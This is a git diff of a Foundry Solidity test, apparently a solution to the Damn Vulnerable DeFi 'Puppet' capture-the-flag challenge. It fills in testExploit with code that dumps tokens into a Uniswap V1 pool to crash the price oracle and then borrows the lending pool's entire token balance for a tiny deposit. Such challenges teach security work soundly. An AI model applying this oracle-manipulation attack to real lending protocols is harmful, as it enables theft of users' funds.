@@ -16,7 +16,6 @@ interface UniswapV1Exchange {
     function balanceOf(address _owner) external view returns (uint256);
 
     function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
-
     function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
 }
 
@@ -96,14 +95,30 @@ contract Puppet is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+    function _printBalances(address a) internal view{
+        console.log("eth balance:", address(a).balance);
+        console.log("dvt balance:", dvt.balanceOf(a));
+    }
 
-        /**
-         * EXPLOIT END *
-         */
+    function _swap() internal {
+        dvt.approve(address(uniswapExchange),type(uint256).max);
+        uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            uniswapExchange.getTokenToEthInputPrice(ATTACKER_INITIAL_TOKEN_BALANCE),
+            block.timestamp
+        );
+    }
+
+    /**
+     * to drain eth also, do inverse swap,debalance ETH/DVT ratio to underprice the eth
+     */
+    function testExploit() public {
+        vm.startPrank(attacker);
+        _swap();
+        uint256 victimBalance = dvt.balanceOf(address(puppetPool));
+        uint256 depositRequired = puppetPool.calculateDepositRequired(victimBalance);
+        puppetPool.borrow{value:depositRequired}(victimBalance);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -125,3 +140,4 @@ contract Puppet is Test {
         return numerator / denominator;
     }
 }
+
